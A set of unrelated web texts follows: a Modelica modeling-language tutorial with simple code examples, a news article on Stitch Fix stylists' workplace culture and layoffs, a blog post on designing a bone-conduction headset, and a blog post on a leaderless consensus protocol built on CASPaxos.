Modelica is a great tool for modeling <a href="https://en.wikipedia.org/wiki/Cyber-physical_system">cyber-physical systems</a>,
for example to study the fuel efficiency of an hybrid vehicle, or to evaluate the interactions between renewable energy sources
and the electrical grid.</p>

<p>In this post I will provide a general overview on Modelica, and I’ll showcase some of its main features.</p>

<h4 id="what-is-modelica">What is Modelica?</h4>

<p>Modelica, as the name suggests, is a modeling language.
Which type of models? Mathematical models.
Modelica does not focus on a particular application domain, and gives you the freedom
to model a variety of problems ranging from electro-mechanical systems for automotive
or aerospace applications, to financial models for banks.</p>

<p>You can use the language to create mathematical models using any combination of the
following formalisms</p>

<ul>
  <li>differential equations</li>
  <li>algebraic equations</li>
  <li>difference equations</li>
  <li>discrete event systems</li>
</ul>

<p>As you can imagine, this kind of flexibility makes it easier to tackle lots of
different and interesting engineering problems, including cyber-physical systems.
Typical examples of such systems are cars. Cars are characterized by mechanical components that interact
with electronics and hydraulic systems, all under the supervision of multiple control systems.
So if you want to know how a car is actually going to behave, you need to simulate the whole shebang.</p>

<p>Ignoring the interaction between components – a rookie mistake in the world of simulations –
would lead to a poor understanding of the system.</p>

<figure>
   <img src="https://marcobonvini.com/images/posts/hybrid-car-scheme.png" alt="A car, typical example of cyber-physical system.">
   <figcaption>
      A car, typical example of cyber-physical systems.
   </figcaption>
</figure>

<p>It’s not hard to find other examples of cyber-phyisical systems, they’re everywhere you look:</p>

<ul>
  <li>every private or public transportation vehicle – from airplanes to e-bikes</li>
  <li>the electrical grid that powers our houses</li>
  <li>data centers that process our data, etc.</li>
  <li>our homes, thanks to the increasing adoption of PV panels, batteries, EV cars, and IoT devices</li>
</ul>

<p>So, at this point you should be convinced that cyber-physical systems are a big part of
everyday life. Modelica allows engineers and scientists to model these systems accurately,
giving us a chance to improve their performance. <strong>This is why Modelica matters</strong>.</p>

<h4 id="modeling-the-real-world">Modeling the real world</h4>

<p>Ask any engineer, and they’ll tell you - “It’s tough to model the real world!”
Engineers perform a balancing act when they create models of complex
physical systems, building detailed simulations while at the same time struggling
against overwhelming complexity or irrelevant detail.</p>

<p>The Modelica modeling language has several features that make it the right choice for
modeling complex engineering systems. Modelica is not some abstract academic toy
disregarded by the modern industry.
In fact, in the last few years Modelica has been adopted by some of the world’s biggest
automotive companies – Audi, BMW, Daimler, Ford, Toyota, and VW. These companies
use Modelica to design energy efficient vehicles, improve air conditioning systems.
They Ferrari F1 team uses Modelica too for designing their racing cars!
And the automotive sector is just one of many that find this language effective.
The aerospace and energy industry are increasingly adopting Modelica, and the US Department
of Energy has been steadily investing in this technology for <a href="https://github.com/lbl-srg/modelica-buildings">modeling buildings</a>
and improving their energy efficiency.</p>

<h4 id="modelica---a-first-example">Modelica - A first example</h4>

<p>As described on the <a href="https://www.modelica.org/">Modelica association</a> website,
<em>Modelica is a non-proprietary, object-oriented, equation based language to conveniently model
complex physical systems including a variety of different aspects, including mechanical,
electrical, electronic, hydraulic, thermal, control, electric power or process-oriented subcomponents.</em></p>

<p>The following diagram shows the big picture behind any Modelica model</p>

<p><img src="https://marcobonvini.com/images/posts/modelica_toolchain.png" width="100%">
</p>


<p>The steps are the following:</p>

<ol>
  <li>an engineer/scientist writes a Modelica model that represents an idea as a series of equations,</li>
  <li>a Modelica tool analyzes the model and verifies its correctness – Does the model have the same number
 of variables and equations? Are there typos?</li>
  <li>the tool compiles the model and generates an executable</li>
  <li>run the executable to simulate the system and produce data.</li>
</ol>

<p>Before diving into some of Modelica’s core concepts let’s start with an example,
a kind of <strong>HelloWorld</strong> of differential equations. We’ll use the simplest
differential equation you can imagine</p>

<p>
$$ \frac{d \, x(t)}{dt} = -2 \, x(t) $$
</p>
<p>with initial condition \( x(t_0) = 5 \)</p>

<div>

<figure><pre><code data-lang="modelica"><span></span><span> 1 </span><span>model</span> <span>HelloWorld</span>  <span>"The simplest differential equation ever"</span>
<span> 2 </span>  <span>// Define variables and parameters here...</span>

<span> 4 </span>    <span>"The unknown variable"</span><span>;</span>
<span> 5 </span>  <span>constant</span> <span>Real</span> <span>a</span> <span>=</span> <span>-</span><span>2.0</span>
<span> 6 </span>    <span>"Constant that characterizes the model"</span><span>;</span>
<span> 7 </span>  <span>parameter</span> <span>Real</span> <span>x_start</span> <span>=</span> <span>5.0</span>
<span> 8 </span>    <span>"Initial value of the variable x"</span><span>;</span>
<span> 9 </span><span>initial</span> <span>equation</span>
<span>10 </span>  <span>// Define initial conditions here...</span>
<span>11 </span>  <span>x</span> <span>=</span> <span>x_start</span><span>;</span>
<span>12 </span><span>equation</span>
<span>13 </span>  <span>// Write the equations here...</span>
<span>14 </span>  <span>der</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>a</span><span>*</span><span>x</span><span>;</span>
<span>15 </span><span>end</span> <span>HelloWorld</span><span>;</span></code></pre></figure>

</div>


<p>The keyword <code>model</code> defines the beginning of a model named <strong>HelloWorld</strong>.
The model is divided in three sections: declarations, initializations and equations.
The model starts by declaring variables, constants and parameters. <strong>Variables</strong> represent
quantities that are expected to change over time. <strong>Constants</strong>, meanwhile, are fixed
quantities that will never change. And finally <strong>parameters</strong> are quantities
that do not change over time but may change between simulations.
In this case parameter <code>x_start</code>, constant <code>a</code> and variable <code>x</code> have the same type,
<code>Real</code> type meaning a floating point number.</p>

<p>The keywords <code>initial equation</code> introduce the second part of our model.
Here we define the initial conditions of the system, for example the value of <code>x</code> at
the beginning of our model’s simulation time.</p>

<p>The keyword <code>equation</code> introduces the third and final part of our program,
where we finally get down to writing the equations of the system.
In this case there is one variable <code>x</code> and one differential equation <code>der(x) = a*x</code>.</p>

<p>One important thing to note is the <code>der(...)</code> operator that indicates the
time derivative of the expression inside the brackets.
The ability to express derivatives in such a clean and concise way is very helpful
when dealing with mathematical models.</p>

<h3 id="modelicas-key-principles">Modelica’s key principles</h3>

<p>So we’ve completed a simple example to get familiar with Modelica. Now, let’s look at
some of its most interesting features. As I mentioned at the beginning of the post,
Modelica is an object-oriented equation-based modeling language.
What exactly do those words mean? Let’s have a look, keeping in the context of
mathematical modeling.</p>

<h4 id="equation-based-modeling">Equation-based modeling</h4>

<p>Computer programs are nothing but clever set of instructions to let a computer solve a particular
problem for us (If this sounds familiar, bear with me. I’m going to make a distinction between
assignments and equations that you might not be familiar with).
Let’s consider the following problem: <em>given two numbers compute their sum</em>.
The following code snippet shows a solution to the problem implemented in C</p>

<div>

<figure><pre><code data-lang="c"><span></span><span>int</span> <span>main</span><span>(</span><span>void</span><span>){</span>
  <span>int</span> <span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>;</span>
  <span>a</span> <span>=</span> <span>4</span><span>;</span>
  <span>b</span> <span>=</span> <span>3</span><span>;</span>
  <span>c</span> <span>=</span> <span>a</span> <span>+</span> <span>b</span><span>;</span>
  <span>return</span> <span>0</span><span>;</span>
<span>}</span></code></pre></figure>

</div>


<p>What happens here when the program is executed is that the value 4 is inserted in the memory space
associated to variable <code>a</code>, the value 3 is inserted in the memory space
associated to variable <code>b</code> and then their sum is assigned to the memory space associated to variable <code>c</code>.</p>

<p>Given the initial problem, this program implements a particular solution to it. And, most of the
time when we write algorithms we are writing specific solutions to certain problems.
In this case the problem and its algorithmic solution were pretty straightforward!</p>

<p>Now here’s the kicker: when dealing with mathematical modeling the situation is quite different.
You typically start with a set of equations that describe the general understanding of the system
you want to model.</p>

<p>Then, you can collected data about that system, and feed it into those equations to start
generating some interesting answers to your questions. Often there are  multiple questions to answer,
so the model should be as general as possible so that it can be be easily manipulated to
answer all the questions.</p>

<p>Let’s get back to our problem: <em>given two numbers compute their sum</em>. The following
is an example of a Modelica model that solves it</p>

<div>

<figure><pre><code data-lang="modelica"><span></span><span>1 </span><span>model</span> <span>Sum</span>
<span>2 </span>   <span>Integer</span> <span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>;</span>
<span>3 </span><span>equation</span>
<span>4 </span>   <span>c</span> <span>-</span> <span>(</span><span>a</span> <span>+</span> <span>b</span><span>)</span> <span>=</span> <span>0</span><span>;</span>
<span>5 </span>   <span>a</span> <span>=</span> <span>4</span><span>;</span>
<span>6 </span>   <span>b</span> <span>-</span> <span>3</span> <span>=</span> <span>0</span><span>;</span>
<span>7 </span><span>end</span> <span>Sum</span><span>;</span></code></pre></figure>

</div>


<p>The content of line 4 is the essence of equation-based modeling. It all boils
down to two concepts:</p>

<ul>
  <li><code>c - (a + b) = 0</code> is an equation and <strong>equations are not assignment</strong> like the ones we’re used to
 write in C, Java, Python, etc.</li>
  <li><code>a = 4</code> and <code>b - 3 = 0</code> are located on lines 5 and 6. Both lines come after
 the first equation, and because <strong>equations are not assignment, their order does not matter</strong>.
 The only thing that matters is that the model has the same number of variables and equations.</li>
</ul>

<p>So it turns out that equation-based modeling is all about writing equations with code. The Modelica tool
of choice will know how to symbolically analyze the model, extract equations, substitute variables
in equations, sort them and apply the proper numerical methods to find the solution.</p>

<h4 id="working-with-causality">Working with Causality</h4>

<p>The equation-based paradigm opens the door to an interesting concept called a-causality.</p>

<p>Before focusing on the meaning and implications of a-causality let’s have a look at an example …</p></div></div></div>

June 30, 2020 | https://www.modernretail.co/startups/how-stitch-fix-built-a-culture-of-silence-among-stylists/ | <a href="https://web.archive.org/web/*/https://www.modernretail.co/startups/how-stitch-fix-built-a-culture-of-silence-among-stylists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>Two weeks after styling service Stitch Fix announced that it was laying off its 1,400 California stylists between now and the fall, morale was low in The Thread, the company’s internal messaging system. Stylists were discussing challenges they were facing in finding the right items to send to clients for their orders, internally called “fixes.”</span></p><p><span>“It’s SO disappointing when I really am trying my hardest and doing the absolute best I can for my clients, even when it’s semi-impossible due to lack of inventory,” wrote one stylist in a message viewed by Modern Retail. “Combined with the fresh feelings from losing this job, the pandemic, and everything else going on in the world…it’s just a lot to take.”&nbsp;</span></p><div id="piano-cta">
<p><span>A second stylist lamented how “it’s so hard when we aren’t given the tools to do our job, and we get criticism from both sides,” referring to customers, as well as managers, internally called leads. “What frustrates me the most is when we get vague communication like, ‘we know this will affect your metrics and we understand,’ yet we still get pressured when things go into the red,” she added.&nbsp;</span></p>

<p><span>A styling supervisor jumped in telling stylists that “Covid has created some unique challenges with inventory vendors that are out of our control,” but that, “I can speak for all of us when I say that we want you to be supported and care so much about how this is making you feel.”&nbsp;</span></p>
<p><span>“They are going to do what’s best by their shareholders,” said one Pittsburgh stylist, when asked by Modern Retail for her reaction to the message. “I do not feel supported.”&nbsp;</span></p>
<p><span>Modern Retail spoke with eleven</span> <span>current and former stylists, more than half of whom joined the company before Stitch Fix’s 2017 IPO. All spoke on condition of anonymity, as Stitch Fix — like many tech companies — has a very broad <a href="https://investors.stitchfix.com/static-files/8715b2d9-c3e9-49e3-8e3a-b7f26f937b8b">definition</a> of what is considered confidential information that stylists aren’t supposed to disclose. Stitch Fix has all of its employees, including stylists, sign confidentiality agreements. </span><span><br>
</span><span><br>
</span><span>Stitch Fix has long maintained that its business model is a blend of art and computer engineering. “We’re experts at both data science and human empathy,” its former CMO Deirdre Findlay <a href="https://www.adweek.com/inside-the-brand/women-trailblazers/how-stitch-fix-cmo-deirdre-blends-art-and-science-for-career-success/">told Adweek last year</a>, about its stylists. Stitch Fix has developed proprietary algorithms that are supposed to help better predict what clothes customers are interested in over time. Yet similar to other so-called tech platforms — like Uber — that rely on a growing fleet of part-time workers, this precarious workforce makes up the service’s real front lines.</span></p>
<p><span>But some stylists said they feel like the artistic side of the company has increasingly been devalued. Since launching in 2011, Stitch Fix has transitioned from a scrappy startup to a profitable publicly-traded company. The vast majority of stylists are part-time, don’t get access to health insurance and are given limited benefits, like one hour of paid sick time for every 30 hours work. (</span><span>They are not, however, independent contractors like Uber driver.) </span></p>
<p><span>Stylists typically have to work between 15 and 29 hours per week, and depending on the region, start out at around $14 to $16 an hour. After a year with the company, they are promoted to “senior stylists,” and are given around a $1 raise to their hourly rate. Going forward from there, they are given raises if Stitch Fix has determined the cost of labor has risen in their particular zip code. One stylist said in nearly three years, her pay has risen just five cents per hour.&nbsp;</span></p>

<p><span>Some stylists also said that Stitch Fix has — in explicit and implicit ways — increasingly discouraged stylists from voicing negative feedback about internal changes and processes. Leads will turn off comments on threads announcing big internal changes, like the impending layoffs of California stylists. Stylists are instructed to post “kind” and “solution-based” messages in the Thread, which makes it hard for them to commiserate with coworkers, according to the current and former stylists Modern Retail spoke with.&nbsp;&nbsp;</span></p>
<p><span>Because Stitch Fix’s stylists are remote, some of them feel like they don’t have many options to escalate feedback to the rest of the company, beyond speaking directly with their manager. During the pandemic, the current stylists that Modern Retail spoke with said they felt like they’ve received conflicting messaging from Stitch Fix about the company’s priorities.&nbsp;</span></p>
<p><span>In response to a list of questions sent by Modern Retail, Stitch Fix provided the following comment: “</span><span>Our stylists are instrumental in building relationships with clients and creating the highly personalized experience Stitch Fix is known for. Their feedback, in partnership with our talented team of merchandisers and data scientists, helps us to continually improve the personalized recommendations of items and outfits we send to our clients.”</span></p>
<p><span>The statement went on: “All of our Stylists care deeply about their clients’ experiences and we encourage them to share feedback, ask questions and discuss learnings. We are committed to providing an open forum where this can take place in a safe and constructive way.”</span></p>
<p><span>The California stylists who are being laid off accounted for 1,400 of Stitch Fix’s roughly 5,100 stylists. Stitch Fix’s other styling hubs are in cheaper locations for the company to operate: Austin, Dallas, Cleveland, Pittsburgh and Minneapolis. So, Stitch Fix is instead hiring 2,000 part-time stylists in its other hubs between now and the end of next year, and offering laid off California stylists the option to apply to relocate to another styling hub. Stylists who do decide to relocate will get money to move, the company said.&nbsp;</span></p>
<p><span>Multiple stylists told Modern Retail that these consolation moves were not enough.“[Stitch Fix] has a very toxically positive environment that I really bought into,” said one former California stylist. “I liked it, but in hindsight after being laid off, I now see that as not sincere and not authentic.”&nbsp;</span></p>
<p><b>Running afoul of Threadiquette<br>
</b><span>When Stitch Fix went public in 2017, it had 2.3 million active clients. Today, that number is up to 3.4 million. The company lost $33.1 million in the most recent quarter due to challenges from the coronavirus. But up until this point, Stitch Fix has consistently reported a profit. In fiscal 2019, Stitch Fix reported a net income of $36.9 million.</span></p>
<p><span>The way that Stitch Fix’s model works is that customers pay $20 for a “fix,” in which stylists send customers five items of clothing and/or accessories they think a customer will like, based on what data the stylist has on that customer’s style. That $20 gets credited towards anything from their fix that they decide to buy. Over time, the company’s algorithms are supposed to be able to better predict what clothes a particular customer will like, and make it easier for the stylist to select clothes for that client.</span></p>
<p><span>Stitch Fix has long referred to its stylists as the “heartbeat” of the company. “It’s more than just an hourly job,” CEO Katrina Lake <a href="https://www.businessoffashion.com/articles/fashion-tech/is-stitch-fix-the-goldilocks-of-fashion">told Business of Fashion in 2016</a>. Despite being on the front lines, some stylists feel they have few ways to air their grievances.</span></p>
<p><span>Stylists are judged on a variety of metrics, such as how many items their clients end up keeping. In the fall, Stitch Fix raised the number of fixes stylists are expected to complete per hour from 4.25 to 4.6, according to six current and former stylists, adding another new challenge.&nbsp;</span></p>
<p><span>The current and former stylists Modern Retail spoke with said they felt their ability to challenge or get answers on why some changes were made to their jobs were also hampered by Stitch Fix’s communication processes.</span></p>
<p><span>On the Thread, conversation is broken up by different business-related topics. Oftentimes, conversation will turn to laments about inventory, or stylists talking about if they are struggling with a particular fix. The stylists said that leads have sometimes jumped into discussions critical of the company and instructed stylists to take concerns directly to them via email. </span><span><br>
</span></p>
<p><span>“We’re not in a typical company where you can go and stand by the water cooler and voice your frustrations to a coworker — not necessarily complaining about the company, but just…feeling like you are not alone,” said a second former California stylist. “It just seemed like you weren’t even allowed to do that because you were looked upon as being negative.”</span></p>
<p><span>There are rules governing use of the Thread — internally called ‘Threadiquette.’ “Thoughts and feedback are what drive change, but how those messages are delivered is important,” read one message viewed by Modern Retail instructing stylists on Threadiquette. Stylists are told to frame critiques with <a href="https://multithreaded.stitchfix.com/blog/2020/05/12/how-people-drive-success-at-stitch-fix/">Stitch Fix’s OS</a> in mind; they’re instructed to be bright, kind and motivated by challenge.&nbsp;</span></p>
<p><span>For example, Stitch Fix defines “motivated by challenge” as being, in part, “someone who thrives in ambiguity and is resilient. Someone who operates with hunger, #StitchFixGrit, and perseverance.” The current and former stylists said that they sometimes feel Stitch Fix uses terms like grittiness and perseverance as an excuse to not make changes that stylists are pushing for, like to inventory or to the algorithms that they use.&nbsp;</span></p>
<p><span>In an exchange viewed by Modern Retail, one stylist, for example, asked her lead for more specifics when Stitch Fix told stylists in 2019 that, going forward, it would be giving raises only if the cost of labor rose based on the zip code each individual stylists worked in. This was a change to the previous model — one that likely resulted in the stylist getting a pay cut. She expressed some disappointment to her lead about the change. The stylist’s lead changed the conversation away from compensation details and pointed her to Stitch Fix’s core values, including being “motivated by challenge,” asking if that clause resonated with her. The stylist interpreted her lead’s email as insinuating that she was not representing Stitch Fix’s core values by questioning company changes.&nbsp;</span></p>
<p><span>This follows a trend; some stylists said leads …</span></p></div></div>

                    <h2 id="hardware-design"><em>Hardware Design</em></h2><p>When we left off in <a href="https://blog.sentienhq.com/the-story-of-sentien-part-ii/">Part II</a>, I had just come to the conclusion that, in order to make a truly seamless interface, I would have to design and build my own hardware. It was the only way to get an audio interface free of KO parameters like a short battery life, blocked ears, non-configurability, and an uncomfortable fit. </p><p>What did I know about hardware design before I got started? </p><p>Absolutely nothing.</p><p>Having tested a variety of headphones, headsets, and earbuds already, I knew that bone conduction tech was the best bet for getting an all-day experience. The other route was using directional speakers, but I wouldn’t have the option of tuning out of my surroundings by plugging my ears. This was essential because blocking outside noise improves concentration.</p><p>In the spirit of J. C. R. Licklider, my main premise was to augment humans in the most natural and efficient way. A way that helps us achieve our goals and be more conscious. An audio interface, as we established in Part II, was the best possible augmentation.</p><h2 id="designing-from-first-principles">Designing from first principles</h2><p>We’ll talk about hardware in a lot more detail in a separate blog post. For now, here’s an overview of my personal experience as a complete beginner.</p><p>I speculated that when building new hardware, I should start from first principles. How do you set up communication between a human and a computer? The fundamentals for a seamless interface are input, output, and ergonomics.</p><p>The goal is to maximise the bandwidth of information exchange and make sure this “relationship” benefits us. On one hand there is a computer, on the other hand there is us. What are the options?</p><h3 id="-us-">|Us|</h3><p><strong>Input:</strong> The base layer is the brain, but seamless BCI interfaces are not yet possible (as <a href="https://blog.sentienhq.com/the-story-of-sentien-part-ii/">we discussed in Part II</a>). I moved one layer up to our five senses: Sight, Hearing, Smell, Taste, Touch.</p><p>For <em>Sight</em>, AR glasses are too far off to be usable.</p><p><em>Smell </em>and <em>Taste </em>are…well, impractical. They’re rather low bandwidth for information, and the technology to support them will not fit in a wearable (as of now).</p><p><em>Touch </em>is interesting. Subtle nudges or taps can indicate a notification, a change of state. The information is mainly binary unless you are using morse code. However, the bandwidth on any complex information is low.</p><p><em>Hearing</em><strong>: </strong>spoken word is high in terms of bandwidth, and a natural way to receive information.</p><p><strong>Output:</strong> Well, one can imagine countless ways that we express ourselves and relay information. Speech, facial expressions, posture, gesturing, manipulating our environment…or lifting your eyebrows. Remember <a href="https://techcrunch.com/2018/04/25/snappables-snapchat-games/">the weightlifting snapchat filter game</a>?</p><p>In terms of human-computer interface, I focused on hand movements and speech. We learn to type fast. An interface made for rapid typing is not wearable—and not always accessible to you seamlessly. Some companies have tried creating wearable keyboards that looked similar to gloves, but people don’t use them. Plus they’re still too large.</p><h3 id="-computers-">|Computers|</h3><p><strong>Input: </strong>Any change in current can be considered an input for computers.</p><p><strong>Output: </strong>Computers combined with specific hardware can generate sound waves or light pixels, move physical things, print on paper…the only limit is our imagination (and technological advancements).</p><p>I filtered through the options and looked at possible output for wearables. Speakers, or bone conduction transducers, to transmit sound. Smart glasses to transmit light via pixels, or LED to indicate state. A touch pad on a headset for haptic taps.</p><figure><img src="https://lh5.googleusercontent.com/Umg9Qr61GOAz7PmRP78XkcdFERP_Mw2NS6py3GXSz48GzkC1wW_x7P-oaeaStK1ykIVEs55RRYLh-12s9OFtLHsS2ia70cnvKWnQSbz3sDR_OXhWBejbcTe3EIjj_ltnzRJoEttQ" alt=""><figcaption>Haptic vibrating electronic parts. I wanted to test them to use for feedback as human input:</figcaption></figure><p>There has to be a way for the person to talk to the computer (output), and a way for the computer to talk to the person (input).</p><p>There were too many all-nighters and brainstorm sessions spent imagining the best interface. Crazy and impossible ideas making the best use of today’s tech. It was all worthwhile, but out of the scope of this blog.</p><p>Tl;dr—I had to make the interface disappear.</p><h3 id="-interface-">|Interface|</h3><p><strong>Output:</strong> <em>Speech (captured by microphones):</em> Microphones can pick up vibrations from the air, or from the body (Bone conduction microphones. The most common placements are on the throat or in the ear canal. I tested throat microphones and the quality was awful. They’re bulky and uncomfortable. You can watch <a href="https://youtu.be/B5_eI9ungGE?t=228">this video</a> if you want more info.) </p><p>In-ear microphones have been used in products such as Bragi Dash to improve sound quality.</p><p><em>Hand movements (captured by touch surfaces):</em> Buttons provide physical certainty that the action was performed. However, the pressure on one’s head is uncomfortable and the button mechanisms take up a lot of space on the wearable.</p><p>Touch surfaces felt more natural for interaction. The haptic response has to be built in to provide feedback for the user that the gesture was successful.</p><p><strong>Input</strong>: I really started from square one for input. How do we hear? Through our ears. What parts of the ear are involved for air conducted versus bone conducted sound? The sound travels through bone, so where on the skull should the transducer go? Forehead? Jaw? Near the ear?</p><p>I ordered various types of bone conduction transducers, got in touch with both high-end and low-end transducer manufacturers, and requested samples. Then I tested every possible location on my skull to see which position gave me the best sound quality and clarity.</p><figure><img src="https://blog.sentienhq.com/content/images/2020/06/bone-conduction-transducer-samples.png" alt="" srcset="https://blog.sentienhq.com/content/images/size/w600/2020/06/bone-conduction-transducer-samples.png 600w, https://blog.sentienhq.com/content/images/2020/06/bone-conduction-transducer-samples.png 940w" sizes="(min-width: 720px) 720px"><figcaption>Bone conduction transducer samples</figcaption></figure><p>While figuring this out, I continued wearing various types of bone conduction headsets every day to help me understand what’s essential, what’s wrong with their design decisions, and how my day changed with this new technology.</p><p>I was able to stay connected throughout the day to both my surroundings and my phone. Because of bone conduction, I always had a choice between the two. I could easily block out a noisy environment in order to focus, just by putting in ear plugs.</p><p>Podcasts and music worked well. Calls and AI assistants were not usable due to poor microphone quality.</p><p>This was happening in wintertime, from 2016 to 2017, when I was finishing my degree and working in the design/art studio. I discovered that the back loop of the headset was not compatible with winter clothes. </p><p>It caught on jacket and coat hoods, scarves, and hats. The transducers would be pulled out of place, interrupting the audio.</p><p>I was also experimenting with various 3D-printed frames for the new design. Putting the transducers in the right place, applying the right pressure, and making sure the microphones were close to the source of sound.</p><figure><img src="https://blog.sentienhq.com/content/images/2020/06/IMG_2241.JPG" alt="" srcset="https://blog.sentienhq.com/content/images/size/w600/2020/06/IMG_2241.JPG 600w, https://blog.sentienhq.com/content/images/size/w1000/2020/06/IMG_2241.JPG 1000w, https://blog.sentienhq.com/content/images/size/w1600/2020/06/IMG_2241.JPG 1600w, https://blog.sentienhq.com/content/images/size/w2400/2020/06/IMG_2241.JPG 2400w" sizes="(min-width: 720px) 720px"><figcaption>A prototype, one-ear headset</figcaption></figure><h2 id="the-fit">The Fit</h2><p>Back to first principles again, I was designing the headset from scratch.

The discomfort was due to the headset getting in the way when I moved my head.</p><p>So I 3D scanned my head in all extreme positions (eg: looking up and right) and determined the place on the head that has the lowest delta in length between the two transducers in all of the extreme positions.</p><figure><img src="https://blog.sentienhq.com/content/images/2020/06/3D-scans-of-imrichs-head--1-.png" alt="" srcset="https://blog.sentienhq.com/content/images/size/w600/2020/06/3D-scans-of-imrichs-head--1-.png 600w, https://blog.sentienhq.com/content/images/2020/06/3D-scans-of-imrichs-head--1-.png 940w" sizes="(min-width: 720px) 720px"><figcaption>3D scans of my head</figcaption></figure><p>(And then later on I managed to get data on about 3,000 3D-scanned human heads from an anthropometry project, and determined the exact difference in lengths among the population.

            <p><span>Abstract.</span> Papers on leaderless consensus protocols such as EPaxos and Atlas describe the protocols from the ground up. This approach helps a reader without prior knowledge to understand how they work, but at the same time it makes it hard for an expert to grok them because they need to trace and check all the assumptions from scratch rather than rely on already proved protocols. This may explain why the leaderless consensus protocols didn't get traction in the industry despite being known since 2013.</p>

            <p>In this post I present a leaderless consensus protocol built in a modular way on top of known consensus protocol. Its modularity helps in understanding and retrofitting into existing solutions.</p>
        </div></div>

            <p>From an engineering perspective a consensus protocol is a replication protocol. Usually it is used to replicate a state of an application (a state machine) to increase its availability. The key difference between consensus and primary-backup replication is an ability to tolerate node and network failures without losing integrity of the data.</p>

            <p>One may think of consensus replication as a strongly consistent variant of master-master replication where any replica (a proposer) can initiate a change. Althrouth consistency is never compromised in practice the concurrent processes may abort each other and stall the performance. In literature this situation is known as dueling proposers.</p>

            <blockquote>"It’s easy to construct a scenario in which two proposers each keep issuing a sequence of proposals with increasing numbers, none of which are ever chosen", Paxos Made Simple</blockquote>

            <blockquote>"The presence of two concurrent leaders can prevent the commitment of any consensus decision and hence prevent progress", Deconstructing Paxos</blockquote>

            <blockquote>"if multiple processes detect that there is no leaser and all attempt to become leader an the same time, then none of the process is likely to succeed (again dueling proposers)", Google SRE book</blockquote>

            <p>The can't be dismissed as a fluke, take latency of CASPaxos when all requests to change the <span>same object</span> land the same replica and latency of CASPaxos when the requests are uniformly distributed across all five replicas.</p>

            <p><img src="http://rystsov.info/images/pacified/dueling.png"></p><p>We see that when there are 20 clients then the dueling reduces throughput 2.85 times from 4513 ops/s to 1581 op/s and increases p99 latency 10.37 times from 4467 microseconds to 46 milliseconds.</p>

            <p>The absolute numbers and the degradation ratio depend on the hardware. For this and all the follow up experiments I simulated <code>5+c</code> nodes cluster (where <code>c</code> is the number of the clients) with around 178 us RTT between any nodes, 655 bytes/us network throughput, 2 ms fsync disk latency and 1132 bytes/us disk throughput, although I haven't pushed the system to the limit of the bandwidth so the throughput numbers for disk and network don't really matter.</p>

            <p>The shape of the charts surprised me. Usually when a system reaches saturation the latency looks linear while throughput reaches plateau and stops growing. But in this case the shapes are inverted which implies that the system is far from saturation and that we can keep adding clients increasing throughput without affecting latency. It happens because CASPaxos replicates state instead of the commands so a proposer can apply multiple commands in chain to the stored state and replicate only the final version (batching on steroids) reducing the load on the network.</p>

            <p>Leslie Lamport suggested using a leader election abstraction to select a leader (a distinguished proposer) which is the only one capable of processing requests. It's worth noting that the idea of a leader is used to reduce contention and not to enforce consistency. Meaning the leader election may be weak and may not prevent the case where several replicas become leaders for the same period of time. It allows the use of a large class of protocols for leader election including randomised timeouts &amp; heartbeats, consistent hashing routering or external arbiter.</p>

            <p>But the idea of leader election has its flaws:</p>

            <ul>
                <li>hardware issues may degrade performance of a leader and affect the whole system</li>
                <li>after a leader fails and until a new leader is elected, a consensus based system becomes unavailable</li>
                <li>randomised leader election under unstable network creates non-trivial failure modes which may delay election of a new leader</li>
            </ul>

            <p>I built a leadered version of consensus replication and used fault injection to demonstrate the issues. The stable leadership is compared with ad hoc leadership which is known to suffer from dueling proposers under normal circumstances. The leaderd system uses 4ms election timeout while the fault injector isolates a random replica for 12ms.</p>

            <p><img src="http://rystsov.info/images/pacified/leader.adhoc.unrest.png"></p><p>For 20 clients the fault injections cause the stable leadership to have 2.46 times lower throughput (709 ops/s vs. 1750 ops/s) and 1.5 times higher p99 latency (60ms vs. 40ms) than an ad hoc leadership approach.</p>

            <p>It looks like we have to choose between scylla and charybdis: either to have 6.36 times lower than optimal throughput (4513 ops/s vs 709 ops/s) during unavoidable transient issues under strong leadership or to have throughput profile independent of failures (1581 ops/s and 1750 ops/s) but both 2.85 times less than optimal under ad hoc leadership.</p>

            <p>The question is if there is a compromise between being fast without failures and being fast on a rainy day. The family of leaderless consensus protocols fills that niche.</p>

            <p><img src="http://rystsov.info/images/pacified/epaxos.png"></p><p>EPaxos solves the contention problem and provides excellent fault tolerance. But despite being around for seven years it hasn't generated enough traction and I don't know any product in the industry which is using it. The lack of interest is especially noticeable if we compare EPaxos to Raft protocol which was discovered around the same time.</p>

            

            <p>The lack of popularity may be attributed to the complexity. I've found several reports on implementing EPaxos: <a href="https://medium.com/princeton-systems-course/reproducing-epaxos-by-ang-li-and-robin-qiu-b5a8fc5262a2">Reproducing EPaxos</a> by Robin Qiu and <a href="https://issues.apache.org/jira/browse/CASSANDRA-6246">EPaxos</a> by Blake Eggleston, and both of them mention the complexity of EPaxos:</p>

            <blockquote>One major drawback of the algorithm is its complexity. From our understanding, EPaxos is more like a two-dimensional Paxos on top of an eventual-consistency-like layer.</blockquote>

            <blockquote>We only implemented the basic EPaxos, and it is already much more complicated than Raft. We believe the fully optimized EPaxos will be even more complicated. In practice, complicated algorithms are hard to design, optimize, and maintain, making them less likely to be adopted in production.</blockquote>

            <blockquote>It’s still pretty rough, I just wanted to get it to a point where we could get a feel for the performance advantages and decide if the additional complexity was worth it</blockquote>

            <p>Funny enough the complexity of the protocol <a href="https://arxiv.org/pdf/1906.10917.pdf">manifested</a> in the official reference implementation of the EPaxos and TLA+ proof having a bug which leads replicas to diverge and break the linearizability of the replicated service.</p>

            <p>This post is an attempt to design a leaderless consensus protocol but keep it simple via the modular approach by reusing already proved components.</p>

        </div></div>

        
          
        <div><div>
            <p>The core idea of the pacified consensus is to order client requests and to let replicas to co-execute the same request in parallel. The preordering reduces contention and parallel execution increases fault tolerance. Even when one replica gets isolated or goes offline another finishes its request without a delay because it is already working on it in parallel.</p>

            <p>The parallel execution doesn't affect correctness because the effects of the parallel execution can be explained by the selective duplication of messages and Paxos tolerates this kind of intrusion</p>

            <blockquote>"Messages can take arbitrarily long to be delivered, can be duplicated, and can be lost, but they are not corrupted", Paxos Made Simple</blockquote>

            <p>The task of ordering client requests in a fault tolerant way and replicating it to the replicas sounds like a consensus problem. It is natural to suggest that running two consensus replication processes can't be faster than running just one but actually it is.</p>

